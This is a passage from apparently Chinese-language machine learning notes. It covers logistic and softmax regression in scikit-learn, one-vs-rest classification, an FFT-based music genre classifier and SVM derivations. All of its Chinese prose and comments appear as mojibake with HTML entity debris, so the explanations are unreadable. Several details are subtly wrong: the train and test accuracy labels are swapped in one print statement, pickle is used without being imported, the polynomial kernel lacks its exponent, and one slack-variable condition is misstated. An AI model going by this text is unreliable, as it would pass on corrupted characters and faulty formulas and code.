\\frac{1}{n}\\sum^n_{i=1}(h_\\theta(x_i)-y_i)x^{(j)}_i} \\Rightarrow \\nabla_{\\theta^{(k+1)}}J(\\theta^{(k+1)}) = \\frac{1}{n}X^T(X\\theta^{(k)}-y) $$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # Sigmoid Function import numpy as np import math import matplotlib.pyplot as plt def sigmoid_function(x): return 1/(1+np.exp(-x)) x = np.linspace(-10,10,1000) y = sigmoid_function(x) plt.xlim(-10,10) plt.ylim(0,1) plt.plot(x,y) plt.plot([0,0],[0,sigmoid_function(0)],\u0026#39;k--\u0026#39;) plt.plot([-10,0],[0.5,sigmoid_function(0)],\u0026#39;k--\u0026#39;) plt.plot(0,sigmoid_function(0)) plt.plot(0,0.5,\u0026#39;ko\u0026#39;) plt.text(0.1, 0.5 + 0.001, \u0026#39;(0 , 0.5)\u0026#39;, fontsize=14, ha=\u0026#39;left\u0026#39;, va=\u0026#39;bottom\u0026#39;) plt.show() â€‹ â€‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # äºŒåˆ†ç±»å®ä¾‹ï¼šä¹³è…ºç™Œ from sklearn.datasets import load_breast_cancer from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.model_selection import train_test_split from sklearn.pipeline import Pipeline from sklearn.metrics import accuracy_score import numpy as np import matplotlib.pyplot as plt # è½½å…¥å‚æ•° X,y = load_breast_cancer(return_X_y=True) # åˆ’åˆ†æµ‹è¯•é›†ä¸è®­ç»ƒé›† X_train,X_test,y_train,y_test = train_test_split( X,y, test_size=0.3, random_state=20230428, stratify=y) # # æ ‡å‡†å½’ä¸€åŒ– # scaler = StandardScaler() # X_train_scaled = scaler.fit_transform(X_train) # X_test_scaled = scaler.fit_transform(X_test) # # æ¨¡å‹è®­ç»ƒ # lg_reg = LogisticRegression() # lg_reg.fit(X_train_scaled,y_train) # # é¢„æµ‹ # y_train_pre = lg_reg.predict(X_train_scaled) # y_test_pre = lg_reg.predict(X_test_scaled) # # è¯„ä¼° # print(\u0026#34;Train:\u0026#34;, accuracy_score(y_train,y_train_pre)*100,\u0026#34;%\u0026#34;) # print(\u0026#34;Test:\u0026#34;,accuracy_score(y_test,y_test_pre)*100,\u0026#34;%\u0026#34;) # å½’ä¸€åŒ– â€”â€” è¯„ä¼°å¯ç”¨Pipelineå®ç° log_reg = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression()) ]) log_reg.fit(X_train,y_train) print(\u0026#34;Test:\u0026#34;,log_reg.score(X_train,y_train)*100,\u0026#34;%\u0026#34;) print(\u0026#34;Train:\u0026#34;,log_reg.score(X_test,y_test)*100,\u0026#34;%\u0026#34;) Test: 99.49748743718592 % Train: 96.49122807017544 % 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # äºŒåˆ†ç±»å®ä¾‹ï¼šé¸¢å°¾èŠ±ä¸‰åˆ†ç±» =\u0026gt; äºŒåˆ†ç±» from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline # 0:\u0026#39;setosa\u0026#39;, 1:\u0026#39;versicolor\u0026#39;, 2:\u0026#39;virginica\u0026#39; X,y = load_iris(return_X_y=True) y = (y==2).astype(int) # äºŒåˆ†åŒ– X_train,X_test,y_train,y_test = train_test_split(X,y,test_size=0.3, random_state=200304) log_reg = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression()) ]) log_reg.fit(X_train,y_train) print(\u0026#39;Train accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_train, y_train) * 100)) print(\u0026#39;Test accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_test, y_test) * 100)) Train accuracy: 97.14 % Test accuracy: 93.33 % å°†å¤šåˆ†ç±»é—®é¢˜è½¬åŒ–ä¸ºåŒåˆ†ç±»é—®é¢˜ One-vs-allï¼ˆOne-vs-restï¼‰ï¼šä»¥é¸¢å°¾èŠ±åˆ†ç±»é—®é¢˜ä¸ºä¾‹ã€‚å°†ä¸‰åˆ†ç±»é—®é¢˜è½¬æ¢ä¸ºä¸‰ä¸ªäºŒåˆ†ç±»é—®é¢˜ï¼ˆåˆ†åˆ«ä¸ºæ˜¯å¦ä¸º\u0026rsquo;setosa\u0026rsquo;ï¼Œæ˜¯å¦ä¸º\u0026rsquo;versicolor\u0026rsquo;ä»¥åŠæ˜¯å¦ä¸º\u0026rsquo;virginica\u0026rsquo;ï¼‰ã€‚å¾—åˆ°ä¸‰ä¸ªé¢„æµ‹å€¼ï¼Œå–æœ€å¤§ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # OneVsRestClassifier from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.multiclass import OneVsRestClassifier from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline # 0:\u0026#39;setosa\u0026#39;, 1:\u0026#39;versicolor\u0026#39;, 2:\u0026#39;virginica\u0026#39; X,y = load_iris(return_X_y=True) X_train,X_test,y_train,y_test = train_test_split(X,y,test_size=0.3, random_state=200304) log_reg = Pipeline([ # (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;ovr\u0026#39;,OneVsRestClassifier( LogisticRegression() ) ) ]) log_reg.fit(X_train,y_train) print(\u0026#39;Train accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_train, y_train) * 100)) print(\u0026#39;Test accuracy: {:.2f} %\u0026#39;.format(log_reg.score(X_test, y_test) * 100)) Train accuracy: 93.33 % Test accuracy: 97.78 % 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # è½¬åŒ–ä¸ºä¸‰ä¸ªäºŒåˆ†ç±»é—®é¢˜ from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline import numpy as np # 0:\u0026#39;setosa\u0026#39;, 1:\u0026#39;versicolor\u0026#39;, 2:\u0026#39;virginica\u0026#39; X,y = load_iris(return_X_y=True) temp = [] X_train,X_test,y_train_init,y_test = train_test_split(X,y,test_size=0.3, random_state=200304) for category in [0,1,2]: y_train = (y_train_init==category) log_reg = LogisticRegression() log_reg.fit(X_train,y_train) temp.append(log_reg.predict_proba(X_test)[:,1]) result = np.empty(len(temp[0])).reshape(-1,1) for i in range(len(temp)): result = np.c_[result,temp[i].reshape(-1,1)] result = result[:,1:] y_test_pre = np.argmax(result,axis=1) acc = (y_test_pre==y_test) print(\u0026#39;Test accuracy: {:.2f} %\u0026#39;.format( (acc.sum()/len(acc))* 100)) Test accuracy: 97.78 % Softmaxå›å½’ï¼ˆå½’ä¸€åŒ–å‡½æ•°å›å½’ï¼‰ â€”â€” å¤šåˆ†ç±» å¤šé¡¹å¼åˆ†å¸ƒï¼š $$\\displaystyle{P(X_1=x_1,\\dots,X_k=x_k;p_1,p_2,\\dots,p_k) = \\frac{n!}{x_1! \\cdots x_k!} p_1^{x_1} \\cdots p_k^{x_k}, \\quad \\sum_{i=1}^k x_i = n}\\displaystyle{\\Rightarrow P(y;\\varphi)=e^{\\displaystyle{\\sum^{k-1}_{i=1}T(y)_iln(\\frac{\\varphi_i}{\\varphi_k})+ln\\varphi_k}} = e^{\\displaystyle{\\eta^TT(y)-a(\\eta)}}}\\Rightarrow\\displaystyle{P_i = P({y^{(i)};\\Theta})=P_k e^{\\displaystyle{\\Theta^{(i)}x}}},\\displaystyle{P_k=\\frac{1}{{\\displaystyle{\\sum^{k}_{j=1}e^{\\displaystyle{\\Theta^{(j)}x}}}}}}$$ï¼Œ $\\displaystyle{\\Theta^{(i)}}$ ä¸º $\\Theta$ çš„ç¬¬ $i$ è¡Œ Softmaxå›å½’å‡½æ•°ï¼š$$ \\displaystyle{P(y^{(i)}=k|x^{(i)};\\theta) = \\frac{\\displaystyle{e^{\\theta_k^Tx^{(i)}}}}{\\displaystyle{\\sum^k_{j=1}e^{\\theta_j^Tx^{(i)}}}}} $$ï¼Œæ­¤æ—¶ $\\theta$ æ˜¯ä¸€ä¸ªçŸ©é˜µ æŸå¤±å‡½æ•°â€”â€”äº¤å‰ç†µæŸå¤±å‡½æ•°ï¼ˆCross-Entropy Lossï¼Œè´Ÿå¯¹æ•°ä¼¼ç„¶æŸå¤±ï¼‰ï¼š$$ \\displaystyle{J(\\theta)=-\\frac{1}{N}\\sum^{N}_{n=1}\\sum^{k}_{i=1}y_i^{(n)}ln(\\hat y_i^{(n)})} $$ï¼Œå…¶ä¸­ $N$ æ˜¯æ ·æœ¬æ•°ï¼Œ $k$ æ˜¯åˆ†ç±»æ•°ï¼Œ $y_i^{(n)}$ æ˜¯çœŸå®æ ‡ç­¾ï¼Œæœä»one-hotç¼–ç ï¼Œ $\\hat y_i^{(n)}$ æ˜¯é¢„æµ‹æ¦‚ç‡ï¼Œå–å€¼ä¸º $(0,1) $ å½“yçš„åˆ†ç±»æ•°ä¸º2æ—¶ï¼ŒSoftmaxå›å½’é€€åŒ–ä¸ºLogistcå›å½’ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import StandardScaler from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline X,y = load_iris(return_X_y=True) X_train,X_test,y_train,y_test = train_test_split( X,y, test_size=0.3, random_state=200304 ) pipe = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression(# é»˜è®¤Softmax solver=\u0026#39;sag\u0026#39;, max_iter=1000, )) ]) pipe.fit(X_train,y_train) pipe.score(X_test,y_test) 0.9777777777777777 å®è·µâ€”â€”éŸ³ä¹åˆ†ç±»å™¨ æ•°æ®é›†è·¯å¾„ï¼š \u0026ldquo;.\\Dataset\\2_Music_Classifier\u0026rdquo; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 from scipy.fft import fft,fftfreq # å¿«é€Ÿå‚…é‡Œå¶è½¬æ¢ from scipy.io import wavfile # è¯»å–wavæ–‡ä»¶æ ¼å¼ from matplotlib.pyplot import specgram as spg # ç»˜åˆ¶é¢‘è°±å›¾ import matplotlib.pyplot as plt from itertools import product path = \u0026#34;./Dataset/2_Music_Classifier/\u0026#34; # wavfileè¿”å›æ ·æœ¬ç‡ï¼ˆæ¯ç§’é‡‡æ ·ä¸ªæ•°ï¼Œå•é€šé“é‡‡æ ·æ€»æ•°ï¼‰ # sample_rate,X = wavfile.read(\u0026#34;./Dataset/2_Music_Classifier/blues/converted/blues.00000.au.wav\u0026#34;) # ç»˜å›¾æŸ¥çœ‹ def frequence_time(mtype,mserial): sample_rate,X = wavfile.read(path+mtype+\u0026#34;/converted/\u0026#34;+mtype+\u0026#34;.\u0026#34;+mserial+\u0026#34;.au.wav\u0026#34;) plt.specgram(X,Fs=sample_rate,xextent=(0,30)) # plt.plot(fft(X,sample_rate)) plt.title(\u0026#34;frequence_time:\u0026#34;+ mtype + \u0026#34;-\u0026#34; + mserial[-1]) plt.ylabel(\u0026#39;frequence\u0026#39;) plt.xlabel(\u0026#39;time\u0026#39;) def magnitude_time(mtype,mserial): sample_rate,X = wavfile.read(path+mtype+\u0026#34;/converted/\u0026#34;+mtype+\u0026#34;.\u0026#34;+mserial+\u0026#34;.au.wav\u0026#34;) time = np.linspace(0,30,len(X)) plt.plot(time,X) plt.title(\u0026#34;magnitude_time:\u0026#34;+ mtype + \u0026#34;-\u0026#34; + mserial[-1]) plt.ylabel(\u0026#39;magnitude\u0026#39;) plt.xlabel(\u0026#39;time\u0026#39;) def magnitude_frequence(mtype,mserial): sample_rate,X = wavfile.read(path+mtype+\u0026#34;/converted/\u0026#34;+mtype+\u0026#34;.\u0026#34;+mserial+\u0026#34;.au.wav\u0026#34;) N = len(X) freqs = fftfreq(N, 1/sample_rate)[:N//2] mag = np.abs(fft(X))[:N//2] plt.plot(freqs,mag) plt.title(\u0026#34;magnitude_frequence:\u0026#34;+ mtype + \u0026#34;-\u0026#34; + mserial[-1]) plt.ylabel(\u0026#39;magnitude\u0026#39;) plt.xlabel(\u0026#39;frequence\u0026#39;) types = [\u0026#39;blues\u0026#39;,\u0026#39;classical\u0026#39;,\u0026#39;country\u0026#39;,\u0026#39;disco\u0026#39;,\u0026#39;hiphop\u0026#39;,\u0026#39;jazz\u0026#39;,\u0026#39;metal\u0026#39;,\u0026#39;pop\u0026#39;,\u0026#39;reggae\u0026#39;,\u0026#39;rock\u0026#39;] serials = [\u0026#39;00000\u0026#39;,\u0026#39;00001\u0026#39;,\u0026#39;00002\u0026#39;] types = types[:] serials = serials[:] plt.figure(num=None,figsize=(8*len(serials),5*len(types)),dpi=80) for index,(t,s) in enumerate(product(types,serials)): plt.subplot(len(types),len(serials),index+1) frequence_time(t,s) plt.show() plt.figure(num=None,figsize=(8*len(serials),5*len(types)),dpi=80) for index,(t,s) in enumerate(product(types,serials)): plt.subplot(len(types),len(serials),index+1) magnitude_time(t,s) plt.show() # plt.figure(num=None,figsize=(8*len(serials),5*len(types)),dpi=80) # for index,(t,s) in enumerate(product(types,serials)): # plt.subplot(len(types),len(serials),index+1) # magnitude_frequence(t,s) types = [types[i] for i in list(np.sort(np.random.choice(range(len(types)),size=5,replace=False)))] serials = serials[:1] plt.figure(num=None,figsize=(8*len(types),5*3),dpi=80) for index,(t,s) in enumerate(product(types,serials)): plt.subplot(3,len(types),0*len(types)+index+1);frequence_time(t,s) plt.subplot(3,len(types),1*len(types)+index+1);magnitude_time(t,s) plt.subplot(3,len(types),2*len(types)+index+1);magnitude_frequence(t,s) plt.show() â€‹ â€‹\n0ã€åˆå§‹åŒ– 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from scipy.fft import fft # å¿«é€Ÿå‚…é‡Œå¶è½¬æ¢ from scipy.io import wavfile # è¯»å–wavæ–‡ä»¶æ ¼å¼ from matplotlib.pyplot import specgram as spg # ç»˜åˆ¶é¢‘è°±å›¾ from itertools import product import matplotlib.pyplot as plt import numpy as np import os from sklearn.pipeline import Pipeline from sklearn.preprocessing import StandardScaler from sklearn.linear_model import LogisticRegression from sklearn.model_selection import train_test_split path = \u0026#34;./Dataset/2_Music_Classifier/\u0026#34; model_path = \u0026#34;D:/MLab/project/StuML/ML/Model/2_Music_Classifier/\u0026#34; max_len = 660000 labels = dict([(label_name,label_num) for label_num,label_name in enumerate(os.listdir(path))]) 1ã€æ•°æ®å¤„ç†ä¸ç‰¹å¾å­˜å‚¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 y = [];X=[] for label_name in labels.keys(): sub_path = path+label_name+\u0026#34;/converted/\u0026#34; for wave_file_name in os.listdir(sub_path): y.append(labels[label_name]) X.append( abs( # å–å¹…å€¼ï¼ˆå®éƒ¨å’Œè™šéƒ¨çš„å¹³æ–¹å’Œå¼€æ ¹å·ï¼‰ fft( # å‚…é‡Œå¶å˜æ¢ wavfile.read( # è¯»å– sub_path+wave_file_name )[1][:max_len] # åˆ‡ç‰‡ ) ) ) X_train,X_test,y_train,y_test = train_test_split( X,y, test_size=0.1, random_state=200304, stratify=y ) # ç‰¹å¾å­˜å‚¨ np.save(model_path+\u0026#34;train_feature\u0026#34;,X_train) np.save(model_path+\u0026#34;train_label\u0026#34;,y_train) np.save(model_path+\u0026#34;test_feature\u0026#34;,X_test) np.save(model_path+\u0026#34;test_label\u0026#34;,y_test) 2ã€æ¨¡å‹è®­ç»ƒä¸å­˜å‚¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 X = np.load(model_path+\u0026#34;train_feature.npy\u0026#34;) y = np.load(model_path+\u0026#34;train_label.npy\u0026#34;) log_reg = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression( max_iter=10000, # solver=\u0026#39;sag\u0026#39; )) ]) log_reg.fit(X,y) with open(model_path+\u0026#34;model_object\u0026#34;,\u0026#34;wb\u0026#34;) as file: pickle.dump(log_reg,file) 3ã€æµ‹è¯•ä¸è¯„ä¼° 1 2 3 4 5 6 7 8 X_test = np.load(model_path+\u0026#34;test_feature.npy\u0026#34;) y_test = np.load(model_path+\u0026#34;test_label.npy\u0026#34;) with open(model_path+\u0026#34;model_object\u0026#34;,\u0026#34;rb\u0026#34;) as file: log_reg = pickle.load(file) log_reg.score(X_test,y_test) # log_reg.score(X_train,y_train) 0.6 æ”¯æŒå‘é‡æœºï¼ˆSVMï¼ŒSupport Vector Machineï¼‰ä¸æ„ŸçŸ¥æœºï¼ˆPerceptronï¼‰ SVMæ˜¯ä¸€ç§äºŒåˆ†ç±»ç®—æ³•ï¼Œæ˜¯å¯¹Perceptronæ¨¡å‹çš„æ‰©å±•,å…·æœ‰æ›´å¼ºçš„æ³›åŒ–èƒ½åŠ› SVM/Perceptronæ¨¡å‹ï¼š $$ y=\\operatorname{sign}(\\theta x)= \\begin{cases} +1, \u0026 \\theta x\u003e0 \\\\ -1, \u0026 \\ \\theta x\u003c0 \\end{cases} $$ é—´éš”ï¼šæ ·æœ¬åˆ°è¶…å¹³é¢çš„è·ç¦» å‡ ä½•è·ç¦»ï¼š$\\displaystyle{\\gamma = \\frac{|w^tx_0+b|}{||w||}}$ï¼Œå…¶ä¸­è¶…å¹³é¢ä¸º $\\displaystyle{w^tx+b=0}$ å¯¹äºæ­£ç¡®åˆ†ç±»çš„æ ·æœ¬ç‚¹ï¼Œæœ‰ $$\\displaystyle{\\gamma = \\frac{y_0(w^tx_0+b)}{\\sqrt{w^tw}} = \\frac{y_0(\\hat y_0+b)}{\\sqrt{w^tw}}}$$ å‡½æ•°è·ç¦»ï¼š$\\displaystyle{\\delta=|w^tx_0+b|}$ å¯¹äºæ­£ç¡®åˆ†ç±»çš„æ ·æœ¬ç‚¹ï¼Œæœ‰ $$\\displaystyle{\\delta=|w^tx_0+b|=y_0(w^tx_0+b)}$$ ç¡¬é—´éš”ï¼šè¦æ±‚æ‰€æœ‰æ ·æœ¬éƒ½å¿…é¡»æ­£ç¡®åˆ†ç±»ï¼Œä¸å…è®¸ä»»ä½•é”™è¯¯ è½¯é—´éš”ï¼šå…è®¸éƒ¨åˆ†æ ·æœ¬åˆ†ç±»é”™è¯¯ï¼Œå®¹å¿ä¸€å®šç¨‹åº¦çš„è¯¯å·®ï¼Œä»¥è·å¾—æ›´å¥½çš„æ³›åŒ–èƒ½åŠ› æ”¯æŒå‘é‡ï¼šç¦»åˆ†å‰²è¶…å¹³é¢æœ€è¿‘çš„é‚£äº›æ ·æœ¬ç‚¹ Perceptronæ€æƒ³ï¼šæœŸæœ›ä½¿åˆ†ç±»é”™è¯¯çš„æ‰€æœ‰æ ·æœ¬ï¼ˆmæ¡ï¼‰åˆ°è¶…å¹³é¢çš„è·ç¦»ä¹‹å’Œæœ€å° $$\\displaystyle{J(\\theta)=\\sum_{i\\in M_\\theta}\\frac{-y^i(\\theta^T x^i+b)}{||\\theta||}}\\Rightarrow \\displaystyle{J(\\theta)=-\\sum_{i\\in M_\\theta}{y^i(\\theta^T x^i+b)}}$$ï¼Œå…¶ä¸­ $M_\\theta$ ä¸ºåˆ†ç±»é”™è¯¯é›† ä¼˜åŒ–ï¼šéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼ˆSGDï¼‰æˆ–å°æ‰¹é‡æ¢¯åº¦ä¸‹é™æ³•ï¼ˆMBGDï¼‰ $$\\displaystyle{\\nabla_\\theta J(\\theta) = -\\sum_{i\\in M_\\theta}y^{(i)}x^{(i)}}$$$ï¼Œæ³¨æ„ï¼Œè¿™é‡Œçš„æ¢¯åº¦å‡½æ•°è¡¨è¾¾å¼å†…éƒ¨è™½ç„¶ä¸ $\\theta$ æ— å…³ï¼Œä½†é”™è¯¯é›† $M_\\theta$ å´ä¸ $\\theta$ ç›¸å…³ SVMæ€æƒ³ï¼šæœŸæœ›ä½¿ç¦»è¶…å¹³é¢æ¯”è¾ƒè¿‘çš„ç‚¹å°½å¯èƒ½åœ°è¿œç¦»è¶…å¹³é¢ â€”â€” äºŒæ¬¡ä¼˜åŒ– çº¿æ€§å¯åˆ†æ”¯æŒå‘é‡æœºï¼šç¡¬é—´éš”æœ€å¤§åŒ–ï¼ˆå®Œç¾åˆ†ç±»æ­£è´Ÿä¾‹ä¸”è·ç¦»è¶…å¹³é¢æœ€è¿‘çš„ç‚¹ç¦»è¶…å¹³é¢è¶Šè¿œè¶Šå¥½ï¼‰ æŸå¤±å‡½æ•°ï¼šæ±‚è§£ï¼ˆæ‹‰æ ¼æœ—æ—¥æ¡ä»¶çº¦æŸï¼‰ï¼š $$ \\begin{aligned} \u0026 \\displaystyle{\\max\\limits_{w,b}\\ \\gamma_{min}=\\frac{y_{min}(w^Tx_{min}+b)}{||w||}}\\\\ s.t. \\quad \u0026\\displaystyle{{\\gamma}_{i} = \\frac{y_i(w^Tx_i+b)}{||w||}\\ge \\gamma_{min} ,i \\in \\{1,2,\\ldots m\\}} \\\\ \\end{aligned} $$ ä»¤ $y_{min}(wx_{min}+b) = 1$ï¼Œåˆ™åŸå¼ç­‰ä»·äº ï¼ˆæŸå¤±å‡½æ•°ï¼‰ï¼š $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_{w,b}\\ \\frac{1}{2}{||w||^2}}\\\\ s.t. \\quad \u0026\\displaystyle{y_i(w^Tx_i+b)\\ge 1 ,i \\in \\{1,2,\\ldots m\\}} \\\\ \\end{aligned} $$ äºŒæ¬¡è§„åˆ’ï¼š æ„å»ºæ‹‰æ ¼æœ—æ—¥å‡½æ•°ï¼š $$\\displaystyle{ L(w,b,\\alpha)=\\frac{1}{2}||w||^2-\\sum^m_{i=1}\\alpha_i[y_i(w^Tx_i+b)-1], \\alpha_i \\ge 0}$$ æ±‚è§£ $$\\displaystyle{\\min\\limits_{w,b}\\max\\limits_{\\alpha_i\\ge 0}L(w,b,\\alpha) \\overset{\\text{å¯¹å¶å‡½æ•°}}{\\Leftrightarrow} \\max\\limits_{\\alpha_i\\ge 0}\\min\\limits_{w,b}L(w,b,\\alpha)}$$ åŸé—®é¢˜ç­‰ä»·äºï¼ˆSMOç®—æ³•æ¨å¯¼ï¼‰ï¼š $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_j(x_iÂ·x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\} \\\\ \u0026\\displaystyle{ \\alpha_i \\ge 0} \u0026,i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ æ±‚ $w^* \\text{ä¸} b^*$ ï¼š $$ \\begin{cases} \\displaystyle{w^* = \\sum^m_{i=1}{\\alpha^*}_iy_ix_i}\\\\ \\displaystyle{y_s({w^*}^Tx_s+b^*)=1,\\quad x_sä¸ºä»»æ„æ”¯æŒå‘é‡}\\\\ \\displaystyle{\\alpha^*(y_s({w^*}^Tx_s+b^*)-1)=0,\\quad å¯è·å¾—æ”¯æŒå‘é‡} \\end{cases} $$ é¢„æµ‹å‡½æ•°ï¼š$$\\hat y = ({w^*}^T x+b^*)$$ çº¿æ€§æ”¯æŒå‘é‡æœºï¼ˆçº¿æ€§ä¸å¯åˆ†ï¼‰ï¼šè½¯é—´éš”æœ€å¤§åŒ–ï¼ˆåœ¨ç¡¬é—´éš”çš„åŸºç¡€ä¸Šå¼•å…¥æ¾å¼›å˜é‡ $\\xi_i \\ge 0$ ï¼‰ æŸå¤±å‡½æ•°ï¼šæ±‚è§£ï¼ˆæ‹‰æ ¼æœ—æ—¥æ¡ä»¶çº¦æŸï¼‰ï¼š $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_{w,b} \\frac{1}{2}{||w||^2} + C{\\sum^m_{i=1}\\xi_i}}\\\\ s.t. \\quad \u0026\\displaystyle{y_i(w^Tx_i+b)\\ge 1-\\xi_i} \u0026, i \\in \\{1,2,\\ldots m\\} \\\\ \u0026\\displaystyle{ \\xi_i \\ge 0}\u0026, i \\in \\{1,2,\\ldots m\\} \\end{aligned} $$ äºŒæ¬¡è§„åˆ’ï¼š æ„å»ºæ‹‰æ ¼æœ—æ—¥å‡½æ•°ï¼š $$ \\displaystyle{ L(w,b,\\xi,\\alpha,\\mu)=\\frac{1}{2}||w||^2+C\\sum^m_{i=1}\\xi_i-\\sum^m_{i=1}\\alpha_i[y_i(w^Tx_i+b)-1+\\xi_i]-\\sum^m_i\\mu_i\\xi_i, \\alpha_i,\\xi_i \\ge 0} $$ æ±‚è§£ $\\displaystyle{\\min\\limits_{w,b,\\xi}\\max\\limits_{\\alpha_i\\ge 0,\\xi_i\\ge 0}L(w,b,\\xi,\\alpha,\\mu) \\overset{\\text{å¯¹å¶å‡½æ•°}}{\\Leftrightarrow} \\max\\limits_{\\alpha_i\\ge 0,\\xi_i\\ge 0}\\min\\limits_{w,b,\\xi}L(w,b,\\xi,\\alpha,\\mu)}$ åŸé—®é¢˜ç­‰ä»·äºï¼ˆSMOç®—æ³•æ¨å¯¼ï¼‰ï¼š $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_j(x_iÂ·x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\}\\\\ \u0026 0 \\le \\alpha_i \\le C \u0026 , i\\in \\{1,2,\\ldots m\\}\\\\ % \u0026 \\xi_i \\ge 0 \u0026 , i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ å¯¹äºæ”¯æŒæ ·æœ¬ $x_i$: $\\alpha_i = 0$ : $x_i$ è¢«æ­£ç¡®åˆ†ç±» $0 \u0026lt; \\alpha_i \u0026lt; C$ : $x_i$ åœ¨è½¯è¾¹ç•Œä¸Š $\\alpha_i = C$ : $x_i$ åµŒå…¥è½¯è¾¹ç•Œå†… $\\xi \u0026lt; 1$ : $x_i$ è¢«æ­£ç¡®åˆ†ç±» $\\xi = 1$ : $x_i$ åœ¨è¶…å¹³é¢ä¸Š $\\xi \u0026gt; 0$ : $x_i$ è¢«é”™è¯¯åˆ†ç±» æ±‚ $w^* \\text{ä¸}b^*$ ï¼š $$ \\begin{cases} \\displaystyle{w^* = \\sum^m_{i=1}{\\alpha}_i^*y_ix_i}\\\\ \\displaystyle{y_s({w^*}^Tx_s+b^*)=1,\\quad x_sä¸ºä»»æ„æ”¯æŒå‘é‡}\\\\ \\displaystyle{\\alpha^*(y_s({w^*}^Tx_s+b^*)-1)=0,\\quad å¯è·å¾—æ”¯æŒå‘é‡} \\end{cases} $$ éçº¿æ€§æ”¯æŒå‘é‡æœºï¼šå‡ç»´ï¼ˆæ ¸å‡½æ•°Kernelï¼‰ å®šä¹‰Kernelå‡½æ•°ï¼š$K(x,z) = \\phi(x)\\phi(z)$ æ­¤æ—¶å¯¹å¶å¤„ç†åçš„ç›®æ ‡å‡½æ•°ä¸ºï¼š $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_jK(x_i,x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\}\\\\ \u0026 0 \\le \\alpha_i \\le C \u0026 , i\\in \\{1,2,\\ldots m\\}\\\\ % \u0026 \\xi_i \\ge 0 \u0026 , i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ å¸¸ç”¨Kernelå‡½æ•°ï¼š çº¿æ€§Kernelå‡½æ•°ï¼š $K(x,z)=x \\cdot z$ å¤šé¡¹å¼Kernelå‡½æ•°ï¼š $K(x,z)=(\\gamma x \\cdot z + r)$ é«˜æ–¯Kernelå‡½æ•°ï¼š $K(x,z)=\\exp(-\\gamma||x-z||^2)$ Sigmoid Kernelå‡½æ•°ï¼š$K(x,z)=\\tanh(\\gamma x \\cdot z + r)$ SMOç®—æ³• SVMç®—æ³•å…³é”®æ­¥éª¤ï¼š æ”¯æŒå‘é‡æœºç®—æ³•æœ€ä¼˜åŒ–é—®é¢˜ï¼ˆæŒ‡å®šæƒ©ç½šç³»æ•°Cï¼‰ï¼š $$ \\begin{aligned} \u0026 \\displaystyle{J(\\alpha)=\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_j(x_iÂ·x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ 